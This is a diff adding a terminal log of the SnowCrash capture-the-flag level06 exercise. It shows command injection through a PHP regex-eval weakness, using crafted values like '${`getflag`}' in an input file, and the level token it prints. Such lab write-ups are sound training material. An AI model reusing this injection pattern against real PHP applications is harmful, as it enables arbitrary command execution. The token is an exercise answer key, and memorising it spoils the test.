@@ -1,0 +1,13 @@
+level06@SnowCrash:~$ echo '[x [x ${`whoami`}]]' > /tmp/hh
+
+level06@SnowCrash:~$ ./level06 /tmp/hh
+PHP Notice:  Undefined variable: flag06
+in /home/user/level06/level06.php(4) : regexp code on line 1
+
+
+level06@SnowCrash:~$ echo '[x [x ${`getflag`}]]' > /tmp/hh
+
+level06@SnowCrash:~$ ./level06 /tmp/hh
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+(x )
